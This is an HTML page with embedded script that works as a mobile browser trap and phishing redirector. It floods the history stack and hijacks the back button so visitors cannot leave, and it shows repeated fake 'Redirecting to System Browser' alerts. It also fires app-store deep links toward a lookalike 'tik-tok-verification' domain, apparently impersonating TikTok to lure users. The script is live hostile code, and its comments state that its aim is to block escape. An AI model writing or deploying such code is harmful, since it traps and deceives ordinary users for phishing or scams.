<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 10000; 
    const gap = 320; 

    function jamHistory() {
        // Pushes the current state into the history 20 times per cycle
        // This makes 'Back' or 'Close' much harder to execute
        for (let i = 0; i < 20; i++) {
            window.history.pushState(null, "", window.location.href);
        }
    }

    function triggerJump() {
        const urlEnc = encodeURIComponent(target);
        const isAndroid = /Android/i.test(navigator.userAgent);
        const trigger = isAndroid 
            ? "market://search?q=" + urlEnc 
            : "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
        window.location.href = trigger;
    }

    function rampage() {
        if (Date.now() > killTime) return;

        // 1. Flood the history stack instantly
        jamHistory();

        // 2. Fire the Redirect
        triggerJump();

        // 3. The 320ms GAP (Protected by history jamming)
        setTimeout(() => {
            if (document.hasFocus()) {
                // Main Alert Lock
                alert("ATTEMPT #32\n\nRedirecting to System Browser...\n\nTap OK to continue.");
                
                // Fire again using the tap momentum
                triggerJump();
                
                // Recurse
                setTimeout(rampage, 1);
            }
        }, gap);
    }

    // Force a jam if they try to use the back button
    window.onpopstate = function() {
        jamHistory();
        triggerJump();
    };

    window.onload = () => {
        rampage();
    };

    window.onblur = () => { if (Date.now() < killTime) triggerJump(); };
</script>

</body>
</html>
